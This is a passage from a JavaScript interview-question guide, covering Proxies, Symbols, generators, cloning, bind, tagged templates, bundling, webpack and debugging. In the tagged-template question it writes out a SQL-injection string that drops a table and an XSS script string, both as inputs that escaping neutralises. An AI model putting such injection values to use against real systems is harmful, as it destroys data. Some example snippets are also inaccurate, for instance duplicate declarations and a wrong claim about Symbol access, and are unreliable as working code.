#### Example Code
```js
// Basic proxy:
const target = { name: 'John', age: 30 };

const proxy = new Proxy(target, {
  get(target, prop) {
    console.log(`Getting ${prop}`);
    return target[prop];
  },
  
  set(target, prop, value) {
    console.log(`Setting ${prop} to ${value}`);
    target[prop] = value;
    return true;
  }
});

proxy.name;  // Logs: "Getting name", returns "John"
proxy.age = 31;  // Logs: "Setting age to 31"

// Validation proxy:
function createValidatedObject(obj) {
  return new Proxy(obj, {
    set(target, prop, value) {
      if (prop === 'age' && (value < 0 || value > 150)) {
        throw new Error('Invalid age');
      }
      target[prop] = value;
      return true;
    }
  });
}

const user = createValidatedObject({});
user.age = 25;  // OK
user.age = 200;  // Throws error

// Virtual properties:
const proxy = new Proxy({}, {
  get(target, prop) {
    if (prop === 'fullName') {
      return `${target.firstName} ${target.lastName}`;
    }
    return target[prop];
  }
});

proxy.firstName = 'John';
proxy.lastName = 'Doe';
console.log(proxy.fullName);  // "John Doe" - computed property

// Reactivity system:
function reactive(obj) {
  return new Proxy(obj, {
    set(target, prop, value) {
      target[prop] = value;
      notifyObservers(target, prop, value);  // Notify all watchers
      return true;
    }
  });
}
```

---

### Question 94: What are Symbols in JavaScript and why are they useful?

#### Definition
Symbols are unique, immutable identifiers - like having a special key that can never be duplicated. Each Symbol is unique, even if created with the same description. They're useful for creating private object properties, avoiding property name conflicts, or creating special well-known symbols that JavaScript uses internally. They're like having a unique ID that can't be accidentally overwritten.

#### Real-World Scenario / Case Study
A library added properties to objects, but users' code sometimes had properties with the same names, causing conflicts. Using Symbols for internal properties ensured they never conflicted with user code. The library could store metadata on objects without risk of collision.

#### Example Code
```js
// Symbols are unique:
const sym1 = Symbol('description');
const sym2 = Symbol('description');
console.log(sym1 === sym2);  // false - each Symbol is unique

// Using Symbols as object keys:
const obj = {};
const sym = Symbol('key');

obj[sym] = 'value';
obj['key'] = 'other value';

console.log(obj[sym]);  // 'value'
console.log(obj['key']);  // 'other value'
// No conflict - Symbol key is separate from string key

// Private properties (not truly private, but hidden):
const _private = Symbol('private');

class MyClass {
  constructor() {
    this[_private] = 'secret';
    this.public = 'visible';
  }
  
  getPrivate() {
    return this[_private];
  }
}

const instance = new MyClass();
console.log(instance.public);  // 'visible'
console.log(instance[_private]);  // undefined (if you don't have the Symbol)
console.log(instance.getPrivate());  // 'secret'

// Well-known Symbols:
class MyArray extends Array {
  static get [Symbol.species]() {
    return Array;  // Methods return Array, not MyArray
  }
}

// Symbol.iterator for custom iteration:
const iterable = {
  [Symbol.iterator]: function* () {
    yield 1;
    yield 2;
    yield 3;
  }
};

for (let value of iterable) {
  console.log(value);  // 1, 2, 3
}
```

---

### Question 95: What are Iterators and Generators in JavaScript?

#### Definition
Iterators are objects that know how to access items one at a time. Generators are functions that can pause and resume, creating iterators. They use `yield` to produce values. It's like a vending machine that gives you one item at a time when you ask, and remembers where it stopped. Useful for lazy evaluation, infinite sequences, or custom iteration logic.

#### Real-World Scenario / Case Study
A system needed to process large datasets (millions of records) without loading everything into memory. Using generators allowed processing records one at a time, only loading what was needed. This reduced memory usage from 2GB to 50MB while processing the same data.

#### Example Code
```js
// Generator function:
function* numberGenerator() {
  yield 1;
  yield 2;
  yield 3;
}

const gen = numberGenerator();
console.log(gen.next().value);  // 1
console.log(gen.next().value);  // 2
console.log(gen.next().value);  // 3
console.log(gen.next().done);   // true

// Infinite generator:
function* infiniteNumbers() {
  let n = 0;
  while (true) {
    yield n++;
  }
}

const numbers = infiniteNumbers();
console.log(numbers.next().value);  // 0
console.log(numbers.next().value);  // 1
// Can generate numbers forever without storing them all

// Custom iterator:
const iterable = {
  *[Symbol.iterator]() {
    yield 1;
    yield 2;
    yield 3;
  }
};

for (let value of iterable) {
  console.log(value);  // 1, 2, 3
}

// Lazy evaluation - process large dataset:
function* processLargeDataset(data) {
  for (let item of data) {
    // Process one item at a time
    const processed = expensiveOperation(item);
    yield processed;
    // Memory efficient - only one item in memory at a time
  }
}

// Usage:
for (let processed of processLargeDataset(largeArray)) {
  display(processed);
}
```

---

### Question 96: What is the difference between `Object.freeze`, `Object.seal`, and `Object.preventExtensions`?

#### Definition
These methods restrict what you can do to objects. `preventExtensions` stops adding new properties (like locking new doors). `seal` prevents adding/removing properties but allows modifying existing ones (like sealing windows but allowing curtains). `freeze` makes objects completely immutable - can't add, remove, or modify properties (like freezing in ice). Each is more restrictive than the last.

#### Real-World Scenario / Case Study
A configuration object was being accidentally modified, causing bugs. Using `Object.freeze` made it immutable, preventing accidental changes. This caught bugs at development time instead of runtime. The team also used `Object.seal` for objects that needed some properties modifiable but structure fixed.

#### Example Code
```js
const obj = { name: 'John', age: 30 };

// preventExtensions - can't add properties:
Object.preventExtensions(obj);
obj.email = 'john@example.com';  // Fails silently or throws in strict mode
obj.name = 'Jane';  // OK - can modify existing
delete obj.age;     // OK - can delete existing

// seal - can't add or delete, but can modify:
Object.seal(obj);
obj.email = 'john@example.com';  // Fails - can't add
delete obj.name;                 // Fails - can't delete
obj.age = 31;                    // OK - can modify existing

// freeze - completely immutable:
Object.freeze(obj);
obj.email = 'john@example.com';  // Fails - can't add
delete obj.name;                 // Fails - can't delete
obj.age = 31;                    // Fails - can't modify

// Nested objects aren't frozen:
const nested = { user: { name: 'John' } };
Object.freeze(nested);
nested.user.name = 'Jane';  // OK - only top level frozen
nested.user.age = 30;       // OK

// Deep freeze:
function deepFreeze(obj) {
  Object.freeze(obj);
  Object.keys(obj).forEach(key => {
    if (typeof obj[key] === 'object' && obj[key] !== null) {
      deepFreeze(obj[key]);
    }
  });
  return obj;
}
```

---

### Question 97: How do you implement deep cloning in JavaScript?

#### Definition
Deep cloning creates a completely independent copy of an object, including all nested objects and arrays. Unlike shallow copying (which copies references), deep cloning creates new objects for everything. It's like making a photocopy of a document with all pages, not just the cover. Useful when you need to modify a copy without affecting the original.

#### Real-World Scenario / Case Study
A state management system was mutating original objects when updating state, causing bugs where old and new state were the same. Implementing deep cloning ensured state updates created truly independent copies. This fixed the bugs and made state changes predictable and debuggable.

#### Example Code
```js
// Shallow copy (not deep):
const original = { a: 1, b: { c: 2 } };
const shallow = { ...original };
shallow.b.c = 3;
console.log(original.b.c);  // 3 - original changed!

// Deep clone methods:

// Method 1: JSON (limitations - no functions, dates, undefined):
function deepCloneJSON(obj) {
  return JSON.parse(JSON.stringify(obj));
}
// Doesn't work with functions, dates become strings, undefined removed

// Method 2: Recursive:
function deepClone(obj) {
  if (obj === null || typeof obj !== 'object') {
    return obj;  // Primitives
  }
  
  if (obj instanceof Date) {
    return new Date(obj.getTime());
  }
  
  if (obj instanceof Array) {
    return obj.map(item => deepClone(item));
  }
  
  if (typeof obj === 'object') {
    const cloned = {};
    for (let key in obj) {
      if (obj.hasOwnProperty(key)) {
        cloned[key] = deepClone(obj[key]);
      }
    }
    return cloned;
  }
}

// Method 3: Structured cloning (modern browsers, Node 17+):
const cloned = structuredClone(original);
// Handles most types including Dates, Maps, Sets, etc.

// Method 4: Using libraries (Lodash):
const cloned = _.cloneDeep(original);

// Handling circular references:
function deepCloneWithCircular(obj, visited = new WeakMap()) {
  if (obj === null || typeof obj !== 'object') {
    return obj;
  }
  
  if (visited.has(obj)) {
    return visited.get(obj);  // Return existing clone for circular ref
  }
  
  const cloned = Array.isArray(obj) ? [] : {};
  visited.set(obj, cloned);
  
  for (let key in obj) {
    if (obj.hasOwnProperty(key)) {
      cloned[key] = deepCloneWithCircular(obj[key], visited);
    }
  }
  
  return cloned;
}
```

---

### Question 98: What is the difference between `call`, `apply`, and `bind`?

#### Definition
All three let you control what `this` refers to in a function. `call` calls the function immediately with a specific `this` and individual arguments. `apply` is like `call` but takes arguments as an array. `bind` doesn't call the function - it returns a new function with `this` and arguments pre-set. It's like different ways to invite someone: call them now, apply with a list, or bind them to come later.

#### Real-World Scenario / Case Study
Event handlers were losing their `this` context when passed as callbacks. Using `bind` to pre-bind `this` fixed the issue. The code could pass bound methods as callbacks without worrying about context loss. This was cleaner than using arrow functions everywhere.

#### Example Code
```js
const person = {
  name: 'John',
  greet: function(greeting, punctuation) {
    return `${greeting}, I'm ${this.name}${punctuation}`;
  }
};

// call - calls immediately with individual arguments:
person.greet.call({ name: 'Jane' }, 'Hello', '!');
// "Hello, I'm Jane!"

// apply - calls immediately with array of arguments:
person.greet.apply({ name: 'Jane' }, ['Hi', '?']);
// "Hi, I'm Jane?"

// bind - returns new function with this and args pre-set:
const boundGreet = person.greet.bind({ name: 'Jane' }, 'Hey');
boundGreet('!');  // "Hey, I'm Jane!"

// Real use case - fixing this context:
class Button {
  constructor() {
    this.clicked = false;
  }
  
  handleClick() {
    this.clicked = true;
  }
  
  // BUGGY - this is lost:
  setup() {
    document.addEventListener('click', this.handleClick);
    // When clicked, this is document, not Button instance
  }
  
  // FIX - bind:
  setup() {
    document.addEventListener('click', this.handleClick.bind(this));
  }
  
  // Or use arrow function:
  handleClick = () => {
    this.clicked = true;
  }
}

// Borrowing methods:
const arrayLike = { 0: 'a', 1: 'b', length: 2 };
const array = Array.prototype.slice.call(arrayLike);
// Converts array-like to real array
```

---

### Question 99: What are Tagged Template Literals and how do they work?

#### Definition
Tagged template literals let you process template strings with a function. Instead of just interpolating values, you can transform the string. The function receives the string parts and interpolated values separately. It's like having a custom interpreter for template strings. Useful for SQL queries, HTML escaping, i18n, or styled components.

#### Real-World Scenario / Case Study
A system was building SQL queries by concatenating strings, vulnerable to SQL injection. Using tagged template literals, they created a `sql` tag that automatically escaped values and validated queries. This prevented SQL injection while keeping the code readable.

#### Example Code
```js
// Regular template literal:
const name = 'John';
const message = `Hello, ${name}!`;  // "Hello, John!"

// Tagged template literal:
function myTag(strings, ...values) {
  console.log(strings);  // ["Hello, ", "!"]
  console.log(values);   // ["John"]
  return strings[0] + values[0] + strings[1];
}

const message = myTag`Hello, ${name}!`;

// SQL tag (prevents injection):
function sql(strings, ...values) {
  let query = strings[0];
  for (let i = 0; i < values.length; i++) {
    const escaped = escapeSQL(values[i]);
    query += escaped + strings[i + 1];
  }
  return query;
}

const userId = "1'; DROP TABLE users; --";
const query = sql`SELECT * FROM users WHERE id = ${userId}`;
// Safely escaped, prevents SQL injection

// HTML escaping tag:
function html(strings, ...values) {
  return strings.reduce((result, str, i) => {
    const value = values[i] ? escapeHtml(values[i]) : '';
    return result + str + value;
  }, '');
}

const userInput = '<script>alert("XSS")</script>';
const safe = html`<div>${userInput}</div>`;
// Escapes HTML, prevents XSS

// Styled components (simplified):
function styled(strings, ...values) {
  return (props) => {
    let css = strings[0];
    for (let i = 0; i < values.length; i++) {
      css += typeof values[i] === 'function' 
        ? values[i](props) 
        : values[i];
      css += strings[i + 1];
    }
    return css;
  };
}
```

---

### Question 100: What is the difference between `var`, `let`, and `const` in terms of hoisting and TDZ?

#### Definition
All three are hoisted (moved to top), but differently. `var` is hoisted and initialized with `undefined` - you can use it before declaration (but get `undefined`). `let` and `const` are hoisted but not initialized - using them before declaration throws an error (Temporal Dead Zone). `var` is function-scoped, `let`/`const` are block-scoped. `const` can't be reassigned after declaration.

#### Real-World Scenario / Case Study
Code using `var` had bugs where variables were `undefined` due to hoisting. Developers accessed variables before declaration, getting `undefined` instead of errors. Switching to `let`/`const` made these bugs obvious - the code threw errors instead of silently using `undefined`. This caught many bugs early.

#### Example Code
```js
// var hoisting:
console.log(x);  // undefined (not an error!)
var x = 5;

// What actually happens:
var x;  // Hoisted, initialized to undefined
console.log(x);  // undefined
x = 5;

// let/const hoisting (TDZ):
console.log(y);  // ReferenceError: Cannot access before initialization
let y = 5;

// What actually happens:
// let y;  // Hoisted but NOT initialized
console.log(y);  // Error - TDZ
y = 5;

// Scope differences:
function example() {
  if (true) {
    var a = 1;  // Function-scoped
    let b = 2;  // Block-scoped
    const c = 3;  // Block-scoped
  }
  console.log(a);  // 1 - accessible
  console.log(b);  // ReferenceError - not accessible
  console.log(c);  // ReferenceError - not accessible
}

// Loop differences:
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);  // 3, 3, 3 (all share same i)
}

for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);  // 0, 1, 2 (each has own i)
}

// const reassignment:
const obj = { a: 1 };
obj.a = 2;  // OK - modifying property
obj = {};   // Error - can't reassign const
```

---

## Modules & Bundlers

### Question 101: What is the difference between CommonJS and ES6 modules?

#### Definition
CommonJS (`require`/`module.exports`) loads modules synchronously at runtime - like reading a book page by page as you go. ES6 modules (`import`/`export`) are static - analyzed at build time, allowing tree-shaking and better optimization. CommonJS is Node.js's original system. ES6 modules are the modern standard, supported in browsers and newer Node.js. Think of CommonJS as a library you visit, ES6 as a catalog you order from.

#### Real-World Scenario / Case Study
A project mixed CommonJS and ES6 modules inconsistently, causing bundling issues. Some files used `require`, others used `import`. The bundler couldn't tree-shake unused code from CommonJS modules. Standardizing on ES6 modules allowed removing 40% of unused code through tree-shaking, reducing bundle size significantly.

#### Example Code
```js
// CommonJS (Node.js style):
// math.js
function add(a, b) {
  return a + b;
}
function subtract(a, b) {
  return a - b;
}
module.exports = { add, subtract };

// app.js
const { add, subtract } = require('./math');
console.log(add(2, 3));

// ES6 modules:
// math.js
export function add(a, b) {
  return a + b;
}
export function subtract(a, b) {
  return a - b;
}

// app.js
import { add, subtract } from './math.js';
console.log(add(2, 3));

// Default exports:
// CommonJS:
module.exports = function() { };

// ES6:
export default function() { }
import myFunction from './module.js';

// Dynamic imports (both support):
// CommonJS:
const module = require('./module');

// ES6:
const module = await import('./module.js');
```

---

### Question 102: How does tree-shaking work in JavaScript bundlers?

#### Definition
Tree-shaking removes unused code from your bundle - like pruning dead branches from a tree. Bundlers analyze your imports and only include code that's actually used. If you import a function from a library but don't use it, tree-shaking removes it. This requires ES6 modules (static analysis) and proper configuration. It's like a smart packer who only puts what you need in your suitcase.

#### Real-World Scenario / Case Study
A project imported entire Lodash library (`import _ from 'lodash'`) but only used 3 functions. The bundle included all of Lodash (70KB). Enabling tree-shaking and using named imports (`import { debounce, throttle } from 'lodash'`) reduced the bundle by 65KB. Only the used functions were included.

#### Example Code
```js
// BAD - imports entire library:
import _ from 'lodash';
const result = _.debounce(myFunction, 300);
// Bundler includes all of Lodash (70KB+)

// GOOD - tree-shakeable:
import { debounce } from 'lodash';
const result = debounce(myFunction, 300);
// Bundler includes only debounce (~2KB)

// Library must support tree-shaking:
// package.json needs:
{
  "sideEffects": false,  // No side effects = safe to tree-shake
  "module": "es/index.js",  // ES6 module entry point
  "main": "lib/index.js"    // CommonJS fallback
}

// Webpack tree-shaking:
// webpack.config.js
module.exports = {
  mode: 'production',  // Enables tree-shaking
  optimization: {
    usedExports: true,  // Mark unused exports
    sideEffects: false  // Assume no side effects
  }
};

// Side effects prevent tree-shaking:
// BAD:
import './styles.css';  // Side effect - can't be removed
import 'polyfill';      // Side effect

// GOOD:
import { specificFunction } from './utils';
```

---

### Question 103: What is code splitting and how do you implement it?

#### Definition
Code splitting breaks your bundle into smaller chunks that load on demand - like chapters in a book instead of one huge volume. Instead of loading all code upfront, you load what's needed when it's needed. This improves initial load time. Routes, features, or components can be split into separate bundles that load lazily.

#### Real-World Scenario / Case Study
A single-page app had a 5MB initial bundle, taking 15+ seconds to load. Users abandoned the site. Implementing route-based code splitting created separate bundles for each route. The initial bundle dropped to 500KB (2 seconds), with route bundles loading as needed. User retention improved significantly.

#### Example Code
```js
// Route-based code splitting (React Router):
import { lazy, Suspense } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

const Home = lazy(() => import('./pages/Home'));
const About = lazy(() => import('./pages/About'));
const Contact = lazy(() => import('./Contact'));

function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<div>Loading...</div>}>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/about" element={<About />} />
          <Route path="/contact" element={<Contact />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}

// Dynamic imports for features:
button.addEventListener('click', async () => {
  const { heavyFeature } = await import('./heavy-feature.js');
  heavyFeature();
  // Only loads when button clicked
});

// Webpack code splitting:
import(/* webpackChunkName: "vendor" */ './vendor.js');
import(/* webpackChunkName: "utils" */ './utils.js');

// React.lazy with named exports:
const Component = lazy(() => 
  import('./Component.js').then(module => ({ default: module.Component }))
);
```

---

## Build Tools & DevOps

### Question 104: What is the purpose of package.json and package-lock.json?

#### Definition
`package.json` is like a recipe card - it lists what your project needs (dependencies) and how to run it (scripts). `package-lock.json` is like a detailed shopping list with exact versions - it locks dependency versions so everyone gets the same versions. This ensures consistent installs across machines. `package.json` says "I need sugar", `package-lock.json` says "I need exactly this brand, this version, from this store".

#### Real-World Scenario / Case Study
A team had "works on my machine" issues - code worked for some developers but not others. The problem was different dependency versions. One developer had React 18.0.0, another had 18.2.0, causing subtle bugs. Committing `package-lock.json` ensured everyone installed exact same versions, eliminating the inconsistencies.

#### Example Code
```json
// package.json - declares dependencies:
{
  "name": "my-app",
  "version": "1.0.0",
  "scripts": {
    "start": "node server.js",
    "test": "jest"
  },
  "dependencies": {
    "express": "^4.18.0",  // ^ means compatible version
    "lodash": "~4.17.21"    // ~ means patch updates only
  },
  "devDependencies": {
    "jest": "^29.0.0"
  }
}

// package-lock.json - locks exact versions:
{
  "dependencies": {
    "express": {
      "version": "4.18.2",  // Exact version
      "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
      "integrity": "sha512-..."
    }
  }
}

// Version ranges:
"express": "^4.18.0"  // 4.18.0 to <5.0.0 (major updates excluded)
"express": "~4.18.0"  // 4.18.0 to <4.19.0 (minor updates excluded)
"express": "4.18.0"   // Exactly 4.18.0
"express": "*"        // Any version (dangerous!)
```

---

### Question 105: How do you optimize webpack builds for production?

#### Definition
Webpack optimization means making your production bundle as small and fast as possible. Techniques include: minification (removing whitespace, shortening names), tree-shaking (removing unused code), code splitting (separate chunks), compression (gzip/brotli), and caching (content hashes for long-term caching). It's like packing efficiently for a trip - smaller, organized, and optimized.

#### Real-World Scenario / Case Study
A production build was 10MB and took 5 minutes to build. Enabling minification, tree-shaking, and code splitting reduced bundle to 2MB and build time to 30 seconds. Adding compression (gzip) further reduced transfer size to 500KB. The site loaded 10x faster.

#### Example Code
```js
// webpack.config.js - production optimization:
module.exports = {
  mode: 'production',  // Enables optimizations
  
  optimization: {
    minimize: true,  // Minify code
    minimizer: [
      new TerserPlugin({
        terserOptions: {
          compress: {
            drop_console: true,  // Remove console.logs
          },
        },
      }),
    ],
    
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        vendor: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors',
          chunks: 'all',
        },
      },
    },
    
    usedExports: true,  // Tree-shaking
    sideEffects: false,
  },
  
  output: {
    filename: '[name].[contenthash].js',  // Cache busting
    chunkFilename: '[name].[contenthash].chunk.js',
  },
  
  plugins: [
    new CompressionPlugin({
      algorithm: 'gzip',  // Compress assets
    }),
  ],
};
```

---

## Error Handling & Debugging

### Question 106: How do you debug memory leaks in JavaScript?

#### Definition
Memory leaks happen when objects aren't garbage collected even though they're no longer needed. To debug: use Chrome DevTools Memory profiler to take heap snapshots, compare snapshots to find growing objects, look for detached DOM nodes, check for event listeners not removed, or closures holding references. It's like finding what's taking up space in a storage unit that should be empty.

#### Real-World Scenario / Case Study
An app's memory grew from 50MB to 2GB over 30 minutes. Using Chrome DevTools Memory profiler, the team took snapshots every 5 minutes and compared them. They found event listeners on removed DOM elements holding references to large data objects. Removing listeners and nulling references fixed the leak.

#### Example Code
```js
// Chrome DevTools Memory Profiling:
// 1. Open DevTools > Memory tab
// 2. Take heap snapshot
// 3. Use app for a while
// 4. Take another snapshot
// 5. Compare - look for growing objects

// Common leak patterns:

// Leak 1 - Event listeners:
function createComponent(data) {
  const element = document.createElement('div');
  element.addEventListener('click', () => {
    console.log(data.hugeObject);  // Closure holds reference
  });
  // If element removed, listener still holds data
}

// Fix:
function createComponent(data) {
  const element = document.createElement('div');
  const handler = () => console.log(data.hugeObject);
  element.addEventListener('click', handler);
  
  return {
    element,
    cleanup: () => {
      element.removeEventListener('click', handler);
      element.remove();
    }
  };
}

// Leak 2 - Timers:
const intervals = [];
function startPolling() {
  intervals.push(setInterval(() => {
    // Do something
  }, 1000));
  // Intervals never cleared
}

// Fix:
const intervals = [];
function startPolling() {
  const id = setInterval(() => {}, 1000);
  intervals.push(id);
  return () => clearInterval(id);
}

// Leak 3 - Global variables:
window.cache = {};
function addToCache(key, value) {
  window.cache[key] = value;  // Grows forever
}
```

---

### Question 107: How do you handle and log errors in production?

#### Definition
Production error handling means catching errors gracefully, logging them for debugging, and showing user-friendly messages. Don't expose technical details to users. Log errors to a service (Sentry, LogRocket) with context (user ID, action, stack trace). Use error boundaries in React to catch component errors. It's like having a security system that alerts you to problems while keeping customers calm.

#### Real-World Scenario / Case Study
An app crashed silently in production - users saw blank screens but no errors were logged. The team had no visibility into what was failing. Implementing error logging with Sentry caught all errors with full context. They fixed 50+ bugs in the first week that were previously invisible. User experience improved significantly.

#### Example Code
```js
// Global error handler:
window.addEventListener('error', (event) => {
  logError({
    message: event.message,
    filename: event.filename,
    lineno: event.lineno,
    colno: event.colno,
    stack: event.error?.stack,
    userAgent: navigator.userAgent,
    url: window.location.href,
  });
});

// Unhandled promise rejections:
window.addEventListener('unhandledrejection', (event) => {
  logError({
    message: 'Unhandled Promise Rejection',
    reason: event.reason,
    stack: event.reason?.stack,
  });
});

// Error logging service (Sentry example):
import * as Sentry from '@sentry/browser';

Sentry.init({
  dsn: 'your-dsn',
  environment: process.env.NODE_ENV,
  beforeSend(event, hint) {
    // Filter sensitive data
    if (event.user) {
      delete event.user.email;
    }
    return event;
  },
});

// Manual error logging:
try {
  riskyOperation();
} catch (error) {
  Sentry.captureException(error, {
    tags: { section: 'checkout' },
    extra: { userId: currentUser.id },
  });
  
  // Show user-friendly message
  showError('Something went wrong. Please try again.');
}

// React Error Boundary:
class ErrorBoundary extends React.Component {
  state = { hasError: false };
  
  static getDerivedStateFromError(error) {
    return { hasError: true };
  }
  
  componentDidCatch(error, errorInfo) {
    Sentry.captureException(error, { contexts: { react: errorInfo } });
  }
  
  render() {
    if (this.state.hasError) {
      return <div>Something went wrong</div>;
    }
    return this.props.children;
  }
}
```

---

### Question 108: What is source mapping and why is it important?

#### Definition
Source maps are like a translation dictionary between minified production code and your original source code. When code is minified, variable names become `a`, `b`, `c` and it's unreadable. Source maps tell the browser "this minified code corresponds to this original file, this line". This lets you debug production code as if it weren't minified. It's like having subtitles that translate back to the original language.

#### Real-World Scenario / Case Study
A production bug was reported but the stack trace showed minified code (`a.b.c is not a function`). Without source maps, debugging was impossible. Enabling source maps allowed seeing the actual file and line number in production errors. The team could debug production issues quickly instead of trying to reproduce locally.

#### Example Code
```js
// webpack.config.js - generate source maps:
module.exports = {
  devtool: 'source-map',  // Generates .map files
  
  // Options:
  // 'source-map' - separate .map file, best quality
  // 'inline-source-map' - embedded in bundle, slower
  // 'eval-source-map' - fast, good for development
  // 'hidden-source-map' - .map file but not referenced
  // 'nosources-source-map' - no source code, just structure
};

// Generated source map (example):
// bundle.js.map
{
  "version": 3,
  "sources": ["src/index.js"],
  "names": ["add", "a", "b"],
  "mappings": "AAAA,SAAS,GAAG",
  "file": "bundle.js"
}

// In production, browser uses source map to show:
// Original: src/index.js:5:10
// Instead of: bundle.js:1:2345

// Conditional source maps (production):
module.exports = {
  devtool: process.env.NODE_ENV === 'production'
    ? 'source-map'  // Full source maps in production
    : 'eval-source-map',  // Fast maps in development
};
```

---

## Additional Core JavaScript Questions

### Question 109: What is the difference between `Object.assign` and the spread operator?

#### Definition
Both copy properties from one object to another, but differently. `Object.assign` mutates the target object and returns it. Spread operator creates a new object. `Object.assign` can copy from multiple sources in one call. Spread is more concise and functional (doesn't mutate). Use spread for creating new objects, `Object.assign` when you need to modify an existing object or copy from many sources.

#### Real-World Scenario / Case Study
Code was mutating state objects directly using `Object.assign`, causing React to not detect changes. Switching to spread operator created new objects, allowing React to properly detect state changes and re-render. This fixed UI update bugs.

#### Example Code
```js
const obj1 = { a: 1, b: 2 };
const obj2 = { c: 3 };

// Object.assign - mutates target:
const result1 = Object.assign(obj1, obj2);
console.log(obj1);  // { a: 1, b: 2, c: 3 } - mutated!
console.log(result1 === obj1);  // true - same object

// Spread - creates new object:
const result2 = { ...obj1, ...obj2 };
console.log(obj1);  // { a: 1, b: 2 } - unchanged
console.log(result2);  // { a: 1, b: 2, c: 3 } - new object

// Object.assign with empty object (doesn't mutate):
const result3 = Object.assign({}, obj1, obj2);
console.log(obj1);  // { a: 1, b: 2 } - unchanged

// Multiple sources:
const merged = Object.assign({}, obj1, obj2, { d: 4 });
// vs
const merged2 = { ...obj1, ...obj2, d: 4 };

// Deep copying (neither does deep copy):
const nested = { a: { b: 1 } };
const copy1 = { ...nested };
copy1.a.b = 2;
console.log(nested.a.b);  // 2 - both reference same object!

// Need deep clone for nested objects
```

---

### Question 110: How do you implement a custom event system?

#### Definition
A custom event system lets objects communicate without directly knowing about each other - like a radio station broadcasting to listeners. You have an event emitter that can emit events, and listeners that subscribe to events. When an event is emitted, all listeners are notified. It's useful for decoupling components and enabling pub/sub patterns.

#### Real-World Scenario / Case Study
Components were tightly coupled - one component directly called methods on others. Adding new features required modifying multiple components. Implementing a custom event system allowed components to communicate through events. Components became independent and easier to test and maintain.

#### Example Code
```js
// Custom EventEmitter:
class EventEmitter {
  constructor() {
    this.events = {};
  }
  
  on(event, callback) {
    if (!this.events[event]) {
      this.events[event] = [];
    }
    this.events[event].push(callback);
    
    // Return unsubscribe function:
    return () => {
      this.off(event, callback);
    };
  }
  
  off(event, callback) {
    if (this.events[event]) {
      this.events[event] = this.events[event].filter(cb => cb !== callback);
    }
  }
  
  emit(event, ...args) {
    if (this.events[event]) {
      this.events[event].forEach(callback => {
        callback(...args);
      });
    }
  }
  
  once(event, callback) {
    const wrapper = (...args) => {
      callback(...args);
      this.off(event, wrapper);
    };
    this.on(event, wrapper);
  }
}

// Usage:
const emitter = new EventEmitter();

const unsubscribe = emitter.on('userLogin', (user) => {
  console.log('User logged in:', user);
});

emitter.emit('userLogin', { id: 1, name: 'John' });

// Unsubscribe:
unsubscribe();

// Once:
emitter.once('setup', () => {
  console.log('Setup complete');
});
emitter.emit('setup');  // Logs
emitter.emit('setup');  // Doesn't log (already removed)
```

---

## More Core JavaScript Questions

### Question 111: What is the difference between `Array.from()` and the spread operator for converting array-like objects?

#### Definition
Both convert array-like objects (NodeList, arguments) to real arrays, but work differently. `Array.from()` is more explicit and can map values during conversion. Spread operator is concise but requires the object to be iterable. `Array.from()` works with array-like objects (has length), spread requires iterables (has Symbol.iterator). Think of `Array.from()` as a universal converter, spread as a quick copy for iterables.

#### Real-World Scenario / Case Study
Code was using spread on `arguments` object, which failed in some browsers. `arguments` is array-like but not iterable in older environments. Switching to `Array.from(arguments)` worked everywhere. The team also used `Array.from()`'s mapping capability to transform NodeList elements during conversion.

#### Example Code
```js
// Array.from() - works with array-like:
const nodeList = document.querySelectorAll('div');
const array1 = Array.from(nodeList);  // Converts NodeList to Array

// Array.from() with mapping:
const array2 = Array.from(nodeList, node => node.textContent);

// Spread - requires iterable:
const array3 = [...nodeList];  // Works (NodeList is iterable in modern browsers)

// arguments object:
function example() {
  // Array.from works:
  const args1 = Array.from(arguments);
  
  // Spread may not work in older browsers:
  const args2 = [...arguments];  // May fail if not iterable
}

// Array-like vs iterable:
const arrayLike = { 0: 'a', 1: 'b', length: 2 };
const fromArray = Array.from(arrayLike);  // Works
const spreadArray = [...arrayLike];  // Error - not iterable

// Making iterable:
arrayLike[Symbol.iterator] = function*() {
  for (let i = 0; i < this.length; i++) {
    yield this[i];
  }
};
const spreadArray2 = [...arrayLike];  // Now works
```

---

### Question 112: How do you implement a queue and stack data structure in JavaScript?

#### Definition
A queue is FIFO (First In First Out) - like a line at a store, first person in is first out. A stack is LIFO (Last In First Out) - like a stack of plates, last one added is first removed. Queues use `push`/`shift` or `unshift`/`pop`. Stacks use `push`/`pop`. Arrays can work but `shift` is slow for queues - better to use linked lists or circular buffers.

#### Real-World Scenario / Case Study
A task queue was using `array.shift()` to process tasks, which is O(n) and slow for large queues. Processing 1000 tasks took 5 seconds. Implementing a proper queue with head/tail pointers made operations O(1), reducing processing time to 50ms. The queue could handle millions of tasks efficiently.

#### Example Code
```js
// Queue implementation:
class Queue {
  constructor() {
    this.items = [];
  }
  
  enqueue(item) {
    this.items.push(item);  // Add to end
  }
  
  dequeue() {
    return this.items.shift();  // Remove from front (slow for large arrays)
  }
  
  peek() {
    return this.items[0];
  }
  
  isEmpty() {
    return this.items.length === 0;
  }
}

// Efficient queue (using linked list concept):
class EfficientQueue {
  constructor() {
    this.head = null;
    this.tail = null;
    this.length = 0;
  }
  
  enqueue(value) {
    const node = { value, next: null };
    if (!this.head) {
      this.head = node;
      this.tail = node;
    } else {
      this.tail.next = node;
      this.tail = node;
    }
    this.length++;
  }
  
  dequeue() {
    if (!this.head) return null;
    const value = this.head.value;
    this.head = this.head.next;
    if (!this.head) this.tail = null;
    this.length--;
    return value;
  }
}

// Stack implementation:
class Stack {
  constructor() {
    this.items = [];
  }
  
  push(item) {
    this.items.push(item);  // Add to end
  }
  
  pop() {
    return this.items.pop();  // Remove from end
  }
  
  peek() {
    return this.items[this.items.length - 1];
  }
  
  isEmpty() {
    return this.items.length === 0;
  }
}

// Usage:
const queue = new Queue();
queue.enqueue(1);
queue.enqueue(2);
console.log(queue.dequeue());  // 1 (FIFO)

const stack = new Stack();
stack.push(1);
stack.push(2);
console.log(stack.pop());  // 2 (LIFO)
```

---

### Question 113: What is the difference between `Array.isArray()` and `instanceof Array`?

#### Definition
